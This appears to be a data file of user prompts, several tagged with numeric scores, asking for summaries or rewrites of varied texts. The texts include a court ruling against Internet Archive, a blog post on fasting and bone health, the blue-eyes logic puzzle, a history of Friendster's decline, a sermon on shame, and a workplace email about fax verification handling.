for the team you want to be. Without a clear identity, there is no north star, and events can easily knock you off course or splinter you into factions.\n\n \n\nWhat do you need to do on the journey to succeed?\n\nBe ready for storms. How are you going to treat each other on your journey? When faced with setbacks and hard times, what values will be your compass to guide you in the direction of safety, belonging, togetherness, and confidence?\n\nOrganize to use your strengths. Each of you will bring different skills and strengths to the journey, which you can use to make it effective. How do you need to organize to make the most of your strengths and get the resources you need to succeed?"]

[5.3409423828125, 4.87611722946167, "Summarize the first part of this court filing for me: \n\nThe plaintiffs in this action, four book publishers, allege that the defendant, an organization whose professed mission is to provide universal access to all knowledge, infringed the plaintiffs\u2019 copyrights in 127 books (the \u201cWorks in Suit\u201d) by scanning print copies of the Works in Suit and lending the digital copies to users of the defendant\u2019s website without the plaintiffs\u2019 permission. The defendant contends that it is not liable for copyright infringement because it makes fair use of the Works in Suit. See 17 U.S.C. \u00a7 107. The parties now crossmove for summary judgment. For the following reasons, the plaintiffs\u2019 motion for summary judgment is granted, and the defendant\u2019s motion for summary judgment is denied.\n\nThe following facts are undisputed unless otherwise noted. The plaintiffs -- Hachette Book Group, Inc. (\u201cHachette\u201d), HarperCollins Publishers LLC (\u201cHarperCollins\u201d), John Wiley & Sons., Inc. (\u201cWiley\u201d), and Penguin Random House LLC (\u201cPenguin\u201d) (together, the \u201cPublishers\u201d) -- are four of the leading book publishers in the United States. Pls.\u2019 56.1, ECF No. 113, \u00b6 1. They obtain from authors the exclusive rights to publish books in print and digital formats, including electronic copies of books, or \u201cebooks.\u201d Id. \u00b6\u00b6 63-68. Publishers and authors generally are paid for sales of each format in which a book is published. Id. \u00b6 65. The defendant, Internet Archive (\u201cIA\u201d), is a non-profit organization dedicated to providing \u201cuniversal access to all knowledge.\u201d Def.\u2019s 56.1, ECF No. 98, \u00b6\u00b6 1-2. Brewster Kahle, IA\u2019s Chairman, founded the organization in 1996. Pls.\u2019 56.1 \u00b6 216. One of IA\u2019s first projects was to document the history of the Internet by archiving every public webpage on the World Wide Web through IA\u2019s \u201cWayback Machine.\u201d Def.\u2019s 56.1 \u00b6 5. IA also works with libraries, museums, universities, and the public to preserve and offer free online access to texts, audio, moving images, software, and other cultural artifacts. Id. \u00b6 6.\n\nThis dispute concerns the way libraries lend ebooks. Public and academic libraries in the United States spend billions of dollars each year obtaining print books and ebooks for their patrons to borrow for free. Pls.\u2019 56.1 \u00b6 113. Libraries usually buy their print books from publishers or wholesalers. Id. \u00b6 114. Copies of ebooks, however, are typically not bought but licensed to libraries from publishers through distributors called \u201caggregators.\u201d Id. \u00b6 117. The Publishers task aggregators with ensuring that a library lends its ebooks only to the library\u2019s members. Id. \u00b6\u00b6 123, 125. The Publishers also require aggregators to employ approved \u201cdigital rights management\u201d (\u201cDRM\u201d) software and other security measures to prevent unauthorized copying or distribution of ebook files. Id. \u00b6 126. Demand for library ebooks has increased over the past decade. In 2012, OverDrive, the largest aggregator, processed 70 million digital checkouts of ebooks and audiobooks; by 2020, that number had risen to 430 million. Id. \u00b6\u00b6 119, 164.\n\nThe Publishers use several licensing models to profit from the distribution of ebooks to libraries. Id. \u00b6\u00b6 120, 122. All four Publishers offer a \u201cone-copy, one-user\u201d model: Libraries pay a single fee for an ebook and patrons check out a copy of that ebook successively, subject to community-based and DRM restrictions. Id. \u00b6 127. Each Publisher offers academic libraries a perpetual term under this model, and Wiley grants perpetual one-copy, one-user licenses to academic and public libraries alike. Id. \u00b6\u00b6 130-132. Hachette and Penguin limit their one-copy, one-user licenses for public libraries to one- or two-year terms, during which there is no limit on the number of times an ebook can be read and after which a library must purchase a new license. Id. \u00b6\u00b6 134, 147. HarperCollins uses a \u201c26-Circ Model,\u201d which allows libraries to circulate an ebook twenty-six times, over any time period, before the license expires. Id. \u00b6\u00b6 135-140. HarperCollins and Penguin also use a Pay-Per-Use model -- a onetime circulation to a single patron at a significantly reduced fee -- and Wiley has experimented with various subscription models. Id. \u00b6\u00b6 141-146, 155, 191. The Publishers\u2019 library expert testified, and IA does not dispute, that this \u201cthriving ebook licensing market for libraries\u201d has \u201cincreased in recent years\u201d and \u201cis predicated on licensing revenues that are paid by libraries to entities like OverDrive.\u201d Id. \u00b6 168. For example, library ebook licenses generate around $59 million per year for Penguin. Id. \u00b6 170. Between 2015 and 2020, HarperCollins earned $46.91 million from the American library ebook market. Id. \u00b6 172.\n\nIA offers readers a different way to read ebooks online for free. Over the past decade, IA has scanned millions of print books and made the resulting ebooks publicly available on its archive.org and openlibrary.org websites (together, the \u201cWebsite\u201d). Id. \u00b6\u00b6 7, 236; Def.\u2019s 56.1 \u00b6 12. IA\u2019s basic modus operandi is to acquire print books directly or indirectly, digitally scan them, and distribute the digital copies while retaining the print copies in storage. The Open Library of Richmond (the \u201cOpen Library\u201d), another non-profit organization run by Brewster Kahle, buys or accepts donations of print books, primarily from Better World Books (\u201cBWB\u201d), a for-profit used bookstore affiliated with IA and the Open Library. Pls.\u2019 56.1 \u00b6\u00b6 313-314, 317, 322, 338. The Open Library then sends the books to IA scanning centers, where operators turn and photograph each page using a book-digitization device called a \u201cScribe.\u201d Id. \u00b6\u00b6 281-283. After scanning, the print books are stored in doublestacked shipping containers and are not circulated. Id. \u00b6\u00b6 310- 312; Def.\u2019s 56.1 \u00b6 23.\n\nIA\u2019s Website includes millions of public domain ebooks that users can download for free and read without restrictions. Def.\u2019s 56.1 \u00b6\u00b6 158, 160. Relevant to this action, however, the Website also includes 3.6 million books protected by valid copyrights, including 33,000 of the Publishers\u2019 titles and all of the Works in Suit. Pls.\u2019 56.1 \u00b6\u00b6 14, 240; Def.\u2019s 56.1 \u00b6 160. The Publishers did not authorize IA to create digital copies of the Works in Suit or to distribute those unauthorized ebook editions on IA\u2019s Website. Pls.\u2019 56.1 \u00b6 243.\n\nIA does not make its ebook copies of copyright-protected works available for mass download. Instead, it professes to perform the traditional function of a library by lending only limited numbers of these works at a time through \u201cControlled Digital Lending,\u201d or \u201cCDL.\u201d Def.\u2019s 56.1 \u00b6 11. CDL\u2019s central tenet, according to a September 2018 Statement and White Paper by a group of librarians, is that an entity that owns a physical book can scan that book and \u201ccirculate [the] digitized title in place of [the] physical one in a controlled manner.\u201d Pls.\u2019 56.1 \u00b6 436. CDL\u2019s most critical component is a one-to-one \u201cowned to loaned ratio.\u201d Id. Thus, a library or organization that practices CDL will seek to \u201conly loan simultaneously the number of copies that it has legitimately acquired.\u201d Id. \u201cFor example, if a library owns three copies of a title and digitizes one copy, it may use CDL to circulate one digital copy and two print, or three digital copies, or two digital copies and one print; in all cases, it could only circulate the same number of copies that it owned before digitization.\u201d Id. According to IA, CDL is especially helpful for patrons who live far from a brick-andmortar library, patrons seeking a book not available from their local library, patrons with disabilities that make it difficult to hold or read print books, and patrons who want brief or spontaneous access to books and for whom it would not be worth a trip to a brick-and-mortar library. Def.\u2019s 56.1 \u00b6\u00b6 55-56. \n\nUnder IA\u2019s implementation of CDL, two factors determine the number of digital copies of a book that can be borrowed at any time from IA\u2019s Website. Id. \u00b6 50. First, IA makes available one digital copy for each non-circulating print book it keeps in storage. Id. \u00b6 51. Second, IA partners with libraries to \u201ccontribute\u201d the number of their print copies of the book toward the number of lendable copies on IA\u2019s Website. Id. \u00b6 52. Even if a partner library has multiple copies of a book, IA counts only one additional copy per library. Id. For example, if IA owns one non-circulating print copy of Laura Ingalls Wilder\u2019s Little House on the Prairie (1932), and three partner libraries each contribute a copy of the book, IA would lend its digital copy of Little House on the Prairie to up to four patrons at a time. Id. \u00b6 53.2\n\nAround 2018, IA began expanding significantly its lending capacity of copyright-protected works through the \u201cOpen Libraries\u201d project. Pls.\u2019 56.1 \u00b6 355. Libraries now can \u201cpool[] their physical collections\u201d with IA \u201cin order to make more lendable copies of digital books available to their users and the world.\u201d Id. \u00b6 363. To participate, a Partner Library sends its catalogue to IA to run an \u201coverlap analysis\u201d that compares ISBN numbers for the Partner Library\u2019s physical holdings with IA\u2019s digital holdings. Id. \u00b6 365. Whenever a book in the Partner Library\u2019s catalogue matches an ebook on IA\u2019s Website, IA increases by one the number of concurrent checkouts of that book allowed on the Website. Id. \u00b6 367. As of late 2021, 62 Partner Libraries, including 13 public libraries, had contributed books through IA\u2019s overlap analysis. Id. \u00b6 392. IA encourages Partner Libraries to populate their websites with links to IA\u2019s Website. Id. \u00b6\u00b6 393-396. \n\nAnyone can become a patron of IA, and borrow up to ten ebooks at a time for up to fourteen days each, by submitting a valid email address. Def.\u2019s 56.1 \u00b6\u00b6 25-26. IA never charges patrons fees for any service, including borrowing books. Id. \u00b6 25. The Website has titles in popular categories, including Romance, Thrillers, \u201cBooks we Love,\u201d and \u201cTrending Books.\u201d Pls.\u2019 56.1 \u00b6\u00b6 514-516. Patrons can read books they have checked out on IA\u2019s BookReader web browser platform, or they can download a \u201cHigh Quality\u201d encrypted PDF or ePub version of the ebook.3 Id. \u00b6\u00b6 207-209, 277; Def.\u2019s 56.1 \u00b6\u00b6 32, 34. IA secures its downloadable versions with software that prevents the patron from copying, accessing, or distributing the book after the loan period. Def.\u2019s 56.1 \u00b6 34. The BookReader application also has a \u201cRead Aloud\u201d feature that converts the text to audio and plays it aloud. Pls.\u2019 56.1 \u00b6 276. After a book is checked out, a \u201cPurchase at Better World Books\u201d button appears at the top of the browser window. Id. \u00b6 346. This button links to BWB\u2019s website, where patrons can buy a used print copy of the book. Id. \u00b6 347. BWB pays IA whenever someone buys a book after using the \u201cPurchase at Better World Books\u201d link. Id. IA\u2019s Website also includes a link to \u201cDonate\u201d to IA.

After a careful look at the studies, we came to the conclusion that so far, daily intermittent fasting seems to be quite safe for the majority of people.\n\nOne question that pops up now and then is the question about the effect of IF on bone health, so when we came across this recent review of the literature on this very topic, published in the British Journal of Nutrition, it caught our attention. \n\nIt\u2019s important to understand what a review of the literature means in that the authors did not conduct a research study of their own but looked at multiple studies on bone density and intermittent fasting, which were pulled from the MEDLINE database until the 30th of September 2022. These review studies can be quite helpful in looking at the overall picture of a particular topic of interest, in this case, bone health and intermittent fasting.\n\nThe authors included studies that looked at various kinds of IF protocols, including the 5:2 diet, alternate day fasting (ADF) and time-restricted eating (TRE) on bone health. Many of these animal studies used intermittent fasting and other practices already known to harm bone health, and the authors admit these results would be very difficult to extrapolate to humans. \n\nThe observational studies in humans do suggest some sort of a link between some IF practices, such as skipping breakfast, and a compromise in bone health, but there was no control for what are known as confounding factors, so again, the data are difficult to interpret and to apply broadly. An observational study is one in which the researchers do not make any active experimental intervention.\n\nThe results of the interventional studies that were included do suggest that time-restricted eating protocols up to six months (which both Denise and I practice) do not adversely affect bone health and, in fact, may have some modest protective effect. Studies that looked at ADF showed no negative effects on bone health, and no studies looked at the 5:2 diet and bone health outcomes. \n\nIn addition, the authors point out that these interventional studies are limited by \u201c\u2026short duration, small and diverse population samples, assessment of total body bone mass exclusively (by DXA) and inadequate control of factors that may affect bone outcomes, making the interpretation of existing data challenging.\u201d \n\nNo surprise here that much more research is needed in this area to make a definite call.\n\nIn the meantime, we say fast on! And, do all the things we currently know to protect the health of your bones, meaning adequate Vitamin D, adequate calcium intake from calcium-rich foods as well as Vitamin K2, and strength training along with weight-bearing exercise."]

It\u2019s a gamble if you get the sale.\n\nSo let\u2019s talk about how you stand out, when you have a lot of competitors.\n\nHere\u2019s your first steps to stand out\n3 steps to make your business stand out:\n1) Group customers by their needs\n2) Break those needs down to actionable parts\n3) Translate the parts to what you\u2019ll do for them\nThis way, you\u2019ll be focused on customers that your competitors aren\u2019t, or provide value to those customers in a different way.\n\nLet\u2019s use a real business as an example as I walk you through each step. My friend, Barrett O\u2019Neill\u2019s storage business, OnDemand Storage (ODS):\n1) Identify customer\nFirst, talk to your most loyal customers to see what needs they have in common.\n\nThese needs will give you an idea of what you do better than anyone else.\n\nSteal these questions to get to know their needs:\n\n\u201cWhen using [our solution], what are you ultimately trying to get done or accomplish?\u201d\n\n\u201cAre you using multiple solutions?\u201d\n\n\u201cWhat are you trying to accomplish as you pull together multiple products and services?\u201d\n\n\u201cWhat\u2019s the final output you\u2019re looking for?\u201d\n\nSource: Questions came from this Jobs to be Done website.\n\nFrom the interviews you\u2019ll create a list of outcomes that your customers are using your solution to achieve.\n\nPhrase the outcomes as \u201cI want to [do a task] so I can [achieve expected outcome]\u201d\n\nFor a \u201ctask\u201d include both the action the customer wants to do, and the object the customer wants to do it to.\n\nFor example:\nI want to store my business equipment during the summer so I can re-open my business in the fall.\n\n2) Understand what the customer values\nNow, we want to translate these needs into something your business can act on. You want to know what your customer values and how you can solve it better than anyone.\n\nBut the word \u201cvalue\u201d is so vague.\n\nBain Consulting thought the word \u201cvalue\u201d was too fluffy too. So they ran a study to break value down into it\u2019s core elements. They found 30 \u201cElements of Value.\u201d\n\nThese elements are much more concrete.\n\nHere\u2019s why I\u2019m so excited about this. If your customer says they want convenience what they really mean is these 4 elements:\n\u2022 Simplifies\n\u2022 Save time\n\u2022 Avoid hassle\n\u2022 Reduce effort\n\nThose 4 elements are much easier to act on! Let\u2019s do that in the next step.\n\nUse the pyramid below to see what \u201cvalue\u201d really means to your customers (and check out this article if you want more of an explanation).\nBain\u2019s Elements of Value\n\n3) Find values where you can win / application\nNow you take those elements and come up with ideas on how your business can solve them better than anyone.\n\nLet\u2019s take that convenience example:\n\u2022 Simplifies\n\u2022 Save time\n\u2022 Avoid hassle\n\u2022 Reduce effort\n\nHere\u2019s the first 3 elements as an example for OnDemand Storage (ODS):\n\nSimplifies:\nStorage is complex if the items need to be picked up from multiple locations. ODS built in-house logistic software to make the logistics simpler.\n\nSave time:\nODS can save time during initial move-in and save time during the storage period itself. A few examples: using autopay, having the facilities ready when users arrive, movers ready on arrival.\n\nAvoid hassle:\nThe big hassle for commercial storage is when they need a space too big for standard storage units, but getting their own warehouse would be too expensive.\n\nBarrett gives businesses this mid-sized storage space so they don\u2019t need their own warehouse. Businesses don\u2019t need insurance, employees, or a logistics network.\n\nYou don\u2019t need a new idea\nYou\u2019ll notice that taking care of what customers value isn\u2019t a new idea. ODS isn\u2019t the first business to handle logistics for you.\n\nWhat makes you different is that you understand what your customers value and message it to them so it\u2019s clear you\u2019re taking care of their specific needs.\n\nIn a later issue we\u2019ll cover how you message your differentiation so that customers know what makes you different.\nApply the above unstructured data to OwnBackup, a business continuity solution for Salesforce."]

They are all perfect logicians -- if a conclusion can be logically deduced, they will do it instantly. No one knows the color of their eyes. Every night at midnight, a ferry stops at the island. Any islanders who have figured out the color of their own eyes then leave the island, and the rest stay. Everyone can see everyone else at all times and keeps a count of the number of people they see with each eye color (excluding themselves), but they cannot otherwise communicate. Everyone on the island knows all the rules in this paragraph.\n\nOn this island there are 100 blue-eyed people, 100 brown-eyed people, and the Guru (she happens to have green eyes). So any given blue-eyed person can see 100 people with brown eyes and 99 people with blue eyes (and one with green), but that does not tell him his own eye color; as far as he knows the totals could be 101 brown and 99 blue. Or 100 brown, 99 blue, and he could have red eyes.\n\nThe Guru is allowed to speak once (let's say at noon), on one day in all their endless years on the island. Standing before the islanders, she says the following:\n\n\"I can see someone who has blue eyes.\"\n\nWho leaves the island, and on what night?\nThere are no mirrors or reflecting surfaces, nothing dumb. It is not a trick question, and the answer is logical. It doesn't depend on tricky wording or anyone lying or guessing, and it doesn't involve people doing something silly like creating a sign language or doing genetics. The Guru is not making eye contact with anyone in particular; she's simply saying \"I count at least one blue-eyed person on this island who isn't me.\"\n\nAnd lastly, the answer is not \"no one leaves.\""]

If Australia allows free imports from those countries, Australian wages will eventually be forced down.\u201d Discuss.\n\n[4 marks]\n\n3. Suppose that wages in Japan are roughly equal to wages in the U.S., yet Japanese wages do not buy as much in goods and services as U.S. wages in their respective countries. Explain the likely reason for this.\n\n[4 marks]\n\nMexico is quite close to the U.S., but it is far from the European Union (EU). So it \nmakes sense that \nit trades largely with the U.S. Brazil is far from both, so its trade is split between the \ntwo. Mexico trades more than Brazil in part because it is so close to a major economy \n(the U.S.) and in part because it is a member of a free trade agreement with a large \neconomy (NAFTA). Brazil is farther away from any large economy and is in a free trade \nagreement with relatively small countries. \n4. The average productivity of labour in Japan and the United States are approximately equal in manufactured goods. However, for services it is much higher in the United States than in Japan. Given that services are mostly non-traded, can the United States still reap a comparative advantage in trading with Japan? Explain. \n\n[4 marks]"]

[5.061891555786133, 6.512962341308594, "I now have a structure to introduce a formal description of uncertainty about theories and their components in empirical scientific inquire. It links concepts from philosophy of science, which are inherently logical via causal systems theory and Bayesian probability. I'm unclear, what can be achieved by this formal description. Presumably, I created this structure as an introduction to my central idea. The central idea is related to a central problem: what happens, if studies are replicated? How can replication activities be formally described? How can they be classified? What are the results of a replication? Is the result binary - a replication is successful or fails? Or is the result a multi-dimensional change in uncertainties? The relevant components are theories as generative models. Theories consist of core components, auxiliary hypothesis, and background knowledge. Together with a specification of boundary conditions, these generative models make predictions (i.e., specify a Bayesian likelihood function). Either, theories make predictions about data - if they model the stochastic sampling process explicitly, or they make predictions about findings. Observations consist of data. From these data, findings are \"extracted\" using statistical inference. So we have two rational processes: one is derivational from theories to findings, and one is statistical inference from data to findings. Replication activities always keep some aspects the same with respect to a reference study, and other aspects are changed. Reproducing the findings from data using the boundary conditions of computational statistical inference scripts keep everything the same: all boundary conditions, the data, only the findings might vary. The reproduction activity results also in a finding which is more or less similar to the reference finding. This reminds me of a further relevant topic, which needs a specific section in the essay: the reference study is the arbitrary selection of one specific study. The complete body of scientific knowledge consists of all studies concerning a specific research question. First, this set consists of one study report. This is one tuple of theory, boundary conditions, data and finding. Every replication activity adds a further tuple to this set. When using this complete set for making Bayesian inference, it is irrelevant, what study is termed as reference study. Changing this assignment does not change the outcome of Bayesian inference. Bayesian inference - and this belongs to the introduction section - is about findings or theories. It can be also about specific boundary conditions. So considering the set of all studies, how strong should the belief b about a finding be: P(finding | all studies). How strong should scientists be convinced about a certain theory: P(theory | all studies). How strong should the belief be, that a certain study used p-hacking or made reporting errors. Both p-hacking and reporting errors are part of the boundary conditions. Both are not explicitly reported but are causally one of the common causes, which produced a certain study-tuple, especially their data and findings. This Bayesian inference on findings or theories requires marginalization over all other aspects of the study tuples and all instances in the set of tuples.\nPlease extract a summary with section headings and subsection headings structuring this collection of ideas."]

The site's evaluation and selection of external providers were based on documented selection criteria, supply constraints, and testing processes. Non-critical suppliers did not require a quality agreement, and their requirements were communicated through initial communications and necessary documents.\n\nThe site established controls for external providers based on the impact of their ability to meet customer requirements. Critical suppliers underwent on-site audits, and incoming inspections were used to establish controls. Supplier performance was monitored and measured through scorecards, and non-conformities were addressed through NCMRs and supplier corrective actions. The audit found documented evidence of management of external providers, including vendor questionnaires, supplier evaluations, and scorecards.\n\nTwo external providers, Beaver and Airborne Testing Spider, were reviewed for their compliance status. Beaver had completed their questionnaire and on-site audit without findings, while Airborne Testing Spider was rated as critical and had completed their evaluation form and was ISO certified.\n\nThe site made updates and improvements to its supplier management program, including adopting a global procedure and transferring multiple suppliers to the global Approved Supplier List to eliminate redundant on-site audits and better manage suppliers with multiple sites.\n\nMinor issues were identified, such as errors in data entry for a supplier scorecard and inaccuracies in some definitions in the SOP compared to the Global purchasing procedure. The Purchasing and Supply Management SOPs were reviewed and found to need updating to align with SAP and remove unnecessary information.\n\nDuring the audit, a deviation from the SOP was identified where meeting minutes of the Annual Supplier Review Meeting were not taken as outlined in the procedure. The deviation has been addressed, and corrective action taken to determine if meeting minutes are a requirement and done by other Repligen sites. Additionally, discrepancies were identified in the attachments section of the SOP-033, where they did not align with the section numbering in the SOP.\n\nOverall, the audit found that the Clifton Park site had effective controls and monitoring in place for external providers. However, there were minor issues identified that were addressed, and the site made improvements to its supplier management program to ensure continued compliance with ISO standards. 400 words 2760 char Copy Text Copy HTML Export PDF Text-Speech Plagiarism Checker Search Trend Bulgarian Chinese Czech Danish Dutch English (US) English (UK) Estonian Finnish French German Greek Hungarian Indonesian Italian Japanese Latvian Lithuanian Polish Portuguese Portuguese (BZ) Romanian Russian Slovak Slovenian Spanish Swedish Turkish UkrainianCopy to Clipboard \n \n \n copycopycopycopycopy"]

It can be attributed as one of the original social networking sites. Friendster allowed users to play online games, send messages, share images/videos and write comments. \n\nThe website was also used for dating and exploring new events, hobbies, and bands. With over 90% of traffic coming from Asia (Philippines, Malaysia, and Singapore), it reached a user base of 115 Million. \n\nHow did Friendster work?\nFriendster\u2019s primary purpose was to allow everyone to interact and socialise with their friends and family and make new friends eventually!\n\nIt offered social gaming, i.e. users could play games with their friends, and it gave users a reasons to keep coming back to its platform. Users could also discover new bands, hobbies, and events in addition to sharing content.\n\nEarlier versions of Friendster were almost similar to 2003\u2019s Facebook. It was the first social media network to accept Asian languages, which helped people connect worldwide.\n\nIn 2009, after the acquisition by MOL, they launched a payment platform, Friendster wallet, which allowed users to spend throughout Friendster\u2019s site for gifts, and new, upcoming goods and services.\n\nIn the same year, they also launched \u201cFriendster iCafe\u201d, offline cybercafes, especially for gamers and \u201cFriendster Hotspots\u201d for retailers as a free wifi infrastructure.\n\nFriendster\u2019s Business Model\nLike any other Social Media Company, advertisement was their primary source of revenue. They sold advertisements for companies who wanted their Ads shown to a massive base of users.\n\nThey also sold access to their APIs to developers, which could be used within the Friendster Network to build and deploy customisable applications on Friendster. Friendster's Developer Program was an open, non-proprietary platform with an open revenue model.\n\nAnother revenue source was the users of the in-app purchase on Friendster\u2019s network using Friendster Wallet.\n\nRise of Friendster\nFriendster.com went live in 2003 and quickly garnered 3 million users within the first few months. It received direct competition from Facebook, Yahoo! And Microsoft 360. Google even offered $30 million to buy out Friendster in 2003, but the offer was turned down. \n\nThey were backed by Kleiner, Perkins, Caufield & Byers, and Benchmark Capital at a reported valuation of $53 Million back then. In 2008, Friendster grew its membership base to more than 115 million registered users and continued to grow in Asia. \n\nOn December 9, 2009, Friendster was acquired for $26.4 million by MOL Global. Next Month, Friendster\u2019s other core technical infrastructure patents were bought by Facebook for $40 million.\n\nWhat happened to Friendster?\nIn June 2011, the company pivoted itself to a social gaming site and discontinued its social network accounts. Friendster gave a deadline of 27 June for users to export their photos. Photos that would not have been exported before the deadline were removed and would no longer be retrievable.\n\nThey said they didn\u2019t want to compete with Facebook but rather complement it. This resulted in bulk migration of its users to Myspace and then finally to Facebook. \n\nAnother reason could be the frequent CEO changes. Within seven years, they changed six CEOs. \n\nIn April 2004, John Abrams was removed as CEO, and Tim Koogle took over as an interim CEO. Koogle previously served as president and CEO at Yahoo!. Scott Sassa later replaced Koogle in June 2004. Sassa left in May 2005 and was replaced by Taek Kwon. Kent Lindstrom then succeeded Taek Kwon.\n\nEach of those CEOs brought a unique leadership style and vision for the company, which made it tough to plan for the long-term.\n\nOne primary reason was the terrible user experience. The site took up to 40 seconds to load; instead of solving the problem, the executive team focused more on adding features, which further deteriorated the user experience. Friendster eventually managed to fix the loading speed issue. Unfortunately, by that time, Myspace and Facebook had already overtaken it, and it became impossible to catch up.\n\nSo What happened to Friendster - It Failed. All the above reasons combined led to the fall of Friendster. On June 14, 2015, the site and its services shut down indefinitely, but the company did not officially close until the end of June 2018.\n\nLessons from Friendster\u2019s failure\nUsers migrated to Facebook, making it the largest social media network even after Friendster\u2019s first-mover advantage. You do not have to be first to win, but learn from your predecessors and do not repeat their mistakes. You can be a copycat and still become a market leader!\n\nRaising funds via venture capital could be disastrous if not done right. Having many board members loses you the flexibility to try out innovative things. It becomes growth above anything else. \n\nFriendster failed to capitalise on its early success as one of the first social media platforms to experience mass uptake. Do not pursue growth at all costs, especially at the expense of your current customers.\n\n\u201cMost people don\u2019t cross the fear chasm, and with good reason, because most startups fail, but to an entrepreneur, the ups and downs sound cool rather than scary.\u201d, John Adams, CEO and Founder of Friendster, in his interview with Nicole Ely from Stanford."]

Two weeks ago, we touched on how living behind the masks of who we think we are supposed to be can become our identity and that it keeps our light hidden. Last week we discussed boundaries \u2013 and becoming clear on our values, what is important to us, and sharing them with others creates space for our authentic selves to be expressed and known \u2013 clarifying our boundaries can build bridges through dialogue. \n\nToday we gather to explore some barriers that keep us from fully embracing our true selves.\n\nAs we navigate our journey of self-discovery and spiritual growth, we may encounter feelings of shame and unworthiness that prevent us from living our most authentic lives.\nThere is no way to talk about authenticity without addressing the elephant in the room: feelings of shame and unworthiness \u2013 which can keep us from even doing this work. Shame is universal in the human experience. It is the feeling that we are \u201cnot enough.\u201d It is a fear of being unlovable that convinces us that if we work harder, change ourselves, keep some parts hidden from others and maybe, when we finally become enough, we will then be worthy of love and connection with others.\n\nLearning what shame is and what triggers shame for us, we will be able to recognize it and move through it with our worthiness. Shame can become a guide for us to the areas that we do not yet love and accept ourselves. It is in those areas we are seeking our worth through the approval of others. \n\nSWAN: Once upon a time, there was a beautiful swan that grew up amongst a flock of ducks. The swan had always felt different, unworthy, and ashamed, as it could not fit in with the ducks around it. It had been told all its life that it was an ugly duckling and that it would never be good enough.\n\nOne day, the swan came across a calm lake where it saw its reflection for the first time. To its surprise, it saw a beautiful, majestic swan staring back. In that moment, it realized that it had never been an ugly duckling; it was a swan, deserving of love and acceptance just as it was. This revelation allowed the swan to let go of the shame and unworthiness it had carried for so long and to embrace its true, authentic self.\n\nLike the swan, we all have inherent worth, as we are made in the image and likeness of the Divine. \n\nErnest Holmes writes, \"You belong to the universe in which you live, you are one with the Creative Genius back of this vast array of ceaseless motion, this original flow of life\" (This Thing Called You, Pg 3). Our worthiness is our birthright, and it is not dependent on external factors or the approval of others.\n\nHowever, shame and unworthiness can manifest in various ways and keep us from embracing our authentic selves. \nBrene Brown states, \"Shame is the intensely painful feeling or experience of believing that we are flawed and therefore unworthy of love and belonging\" (The Gifts of Imperfection, Pg. 39).\n\nHow do shame or unworthiness can prevent us from living authentically? \n1. Fear of expressing our true emotions: Shame may cause us to suppress our emotions and hide our authentic selves, fearing judgment or ridicule from others. \n2. Struggling with self-care: When we feel unworthy, we may neglect our physical, emotional, and mental well-being, believing that we don't deserve self-care. This can lead to burnout, exhaustion, and a disconnection from our authentic selves.\n3. Seeking validation from others: A sense of shame or unworthiness can cause us to rely on the approval and validation of others, rather than trusting our own instincts and values. This can result in inauthentic behavior, as we strive to please others and meet their expectations instead of living true to ourselves.\n\nTo release shame and unworthiness and embrace our authentic selves, we must first recognize and acknowledge these feelings. And for this reason we are discuss this today.\n\nErnest Holmes explains, \"When you stop condemning yourself, the condemnation of others will not reach you\" (New Horizons, 7). It's essential to confront these emotions, process them, and ultimately let them go.\n\nWhat are some actions we can take to help us release shame and unworthiness and embrace your authentic self. This morning I\u2019ll offer you 4 as a starting place to support you:\n1. Create an inventory of your triggers: Awareness is the first step in transforming these feelings and reclaiming your power. Recognizing and understanding what triggers feelings of shame and unworthiness within you can help you face them head-on. \n2. Share your story with a trusted person: Brene Brown puts it, \"Shame needs three things to grow out of control in our lives: secrecy, silence, and judgment\u2026 We need to share our experience; shame loses power when it is spoken\" (The Gifts of Imperfection, Pg. 40). Opening up about your feelings of shame and unworthiness to someone you trust can be a healing and empowering experience. In 12 step recovery, there is the 5th step where, \u201cAdmitted to God, to ourselves, and to another human being the exact nature of our wrongs.\u201d This vital exercise begins to provide emotional, mental and spiritual relief. By sharing wrong with a trusted confidant, guilt and shame start to melt away. \n3. Practice self-awareness and self-compassion: Mindfulness and meditation can help us develop greater self-awareness and foster self-compassion, and equanimity. Through understanding and embracing all aspects of yourself, including the parts you may feel ashamed or unworthy of, you can begin to cultivate authenticity and inner strength.\n4. Affirm your worthiness: Regularly remind yourself of your inherent worth through affirmations, such as \"I am worthy. I am loved. I am enough.\" Say this with me\u2026.This practice can help you internalize a sense of worthiness and reinforce your self-confidence.\n\nReleasing feelings of shame and unworthiness is a crucial step in embracing our authentic selves and living a life in alignment with our true nature. As we recognize, confront and process these emotions, we open ourselves up to a deeper sense of self-love, self-acceptance, and personal power.\n\nPrem Prakash, \"Our stresses, anxieties, pains, and problems arise because we do not see the world, others, or even ourselves as worthy of love\" (The Yoga of Spiritual Devotion: A Modern Translation of the Narada Bhakti Sutras). \n\nBy recognizing our inherent worthiness and shedding the shame and unworthiness that hold us back, we can fully embrace our authentic selves and live a life of love, connection, and joy.\n\nMay we all continue to support one another on this journey, and may we find the courage and strength to live our most authentic lives."]

Feel free to ask clarifying questions that may help convey the issue and need for change.\n\nGood Friday,\n\nPer Larry, I was advised to send an email on a topic that merits follow-up when things quiet down. This being our process for sorting, attaching, and deleting incoming verifications via email/fax. \n\nThere are 2 items in this area that merit review and possible revision.\n\nThe first of which being the fax number we provide verifiers; 512-858-9092. Verifications correctly sent to this number, based off of my understanding, will automatically be attached to the correct component. It seems to work great when verifiers read instructions and place the documents in the correct order before being faxed, however, there is a growing amount of anecdotal evidence that suggest this is often not done correctly. We\u2019re unable to determine exactly how often this happens and it may even be the case that verifiers are sending them in the right order but whatever system they utilize may not allow for our system to properly receive and attach components. I propose that we no longer use this fax/service as some investigators including myself have had issues following up with verifiers for missing faxes only to find out they were already sent and we\u2019re wasting time getting them resent and the time saved by accio managing the attachment is more than wasted by the amount of time we spend on sent fax follow-up. \n\nThe second item of concern is the process we have to manage incoming verifications sent to fax 509-321-0434 or nuclearverifications@pinnacleprof.com. From time to time it seems that verifications are not correctly attached or moved to attachments folder and the incoming item is deleted, prompting more investigator time spent following up with verifiers or going Best Effort on something we may have otherwise had official on. Revisions may include additional oversight/checks for properly attaching documents or moving/assigning documents to a personal inbox to be handled by one person at a time, as I understand some of these mistakes may stem from multiple people operation the inbox at once and things either shifting around when clicking or otherwise being disorganized."]

